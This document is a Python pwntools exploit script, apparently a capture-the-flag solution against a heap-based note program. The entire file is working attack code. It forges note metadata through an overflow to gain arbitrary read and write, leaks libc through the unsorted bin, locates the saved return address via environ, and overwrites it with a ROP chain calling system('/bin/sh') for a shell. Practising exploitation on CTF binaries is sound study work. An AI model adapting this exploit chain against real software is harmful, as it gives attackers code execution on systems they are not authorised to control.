#!/usr/bin/env python3
from pwn import *


exe = context.binary = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = "info"

HOST = "34.62.69.250"
PORT = 41070


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process([exe.path])


def sla(io, delim, data):
    io.sendlineafter(delim, data)


def sa(io, delim, data):
    io.sendafter(delim, data)


def alloc(io, size, data=b"A"):
    sla(io, b"Choice: ", b"1")
    sla(io, b"Size: ", str(size).encode())
    sa(io, b"Data: ", data.ljust(size, b"\0"))


def edit(io, idx, size, data):
    sla(io, b"Choice: ", b"2")
    sla(io, b"Index: ", str(idx).encode())
    sla(io, b"New size: ", str(size).encode())
    sa(io, b"Data: ", data.ljust(size, b"\0"))


def free(io, idx):
    sla(io, b"Choice: ", b"3")
    sla(io, b"Index: ", str(idx).encode())


def show(io, idx, size):
    sla(io, b"Choice: ", b"4")
    sla(io, b"Index: ", str(idx).encode())
    io.recvuntil(b"Data: ")
    data = io.recvn(size)
    io.recvn(1)  # trailing newline from putchar
    return data


def forge_note(io, size, ptr):
    # note0 data is immediately followed by note1's metadata chunk.
    # Offset 0x20 reaches note1->size; the overwritten chunk size stays plausible.
    payload = flat(
        b"A" * 0x18,
        0x21,
        size,
        ptr,
    )
    edit(io, 0, len(payload), payload)


def arb_read(io, addr, size=8):
    forge_note(io, size, addr)
    return show(io, 1, size)


def arb_write(io, addr, data):
    forge_note(io, len(data), addr)
    edit(io, 1, len(data), data)


def main():
    io = start()

    # Adjacent controllable notes for the later metadata overwrite.
    alloc(io, 0x18, b"A" * 0x18)  # idx 0
    alloc(io, 0x18, b"B" * 0x18)  # idx 1

    # Fill the 0x410 tcache bin and place the eighth chunk in unsorted bin.
    for _ in range(8):            # idx 2..9
        alloc(io, 0x408, b"C" * 8)
    alloc(io, 0x18, b"G" * 0x18)  # idx 10, guard against top consolidation
    for i in range(2, 9):
        free(io, i)
    free(io, 9)

    leak = show(io, 9, 0x10)
    unsorted = u64(leak[:8])
    log.info("unsorted leak: %#x", unsorted)

    # On this libc, a single unsorted chunk points at main_arena+0x60.
    libc.address = unsorted - 0x219ce0
    log.info("libc base: %#x", libc.address)
    if not args.REMOTE:
        log.info("actual libc base: %#x", io.libs()[libc.path])

    environ = u64(arb_read(io, libc.sym["environ"], 8))
    log.info("environ: %#x", environ)

    stack = b""
    # The saved return into __libc_start_main sits just below the envp area.
    # Reading too far below that can cross the remote stack mapping boundary.
    scan_start = environ - 0x1000
    scan_size = 0x1000
    for off in range(0, scan_size, 0x400):
        stack += arb_read(io, scan_start + off, 0x400)

    main_ret = None
    for off in range(0, len(stack) - 8, 8):
        val = u64(stack[off:off + 8])
        if val - libc.address == 0x29d90:
            main_ret = scan_start + off
            break
    if main_ret is None:
        log.failure("could not find main return address")
        io.close()
        return

    edit_ret = main_ret - 0x20
    log.info("main saved RIP: %#x", main_ret)
    log.info("next edit saved RIP: %#x", edit_ret)

    rop = ROP(libc)
    chain = flat(
        rop.find_gadget(["ret"])[0],
        rop.find_gadget(["pop rdi", "ret"])[0],
        next(libc.search(b"/bin/sh\0")),
        libc.sym["system"],
    )

    arb_write(io, edit_ret, chain)

    if args.TEST:
        io.sendline(b"echo PWNED")
        io.recvuntil(b"PWNED", timeout=2)
        log.success("local shell command executed")

    if args.CMD:
        io.sendline(args.CMD.encode())
        print(io.recvrepeat(2).decode(errors="replace"))
        io.close()
        return

    io.interactive()


if __name__ == "__main__":
    main()
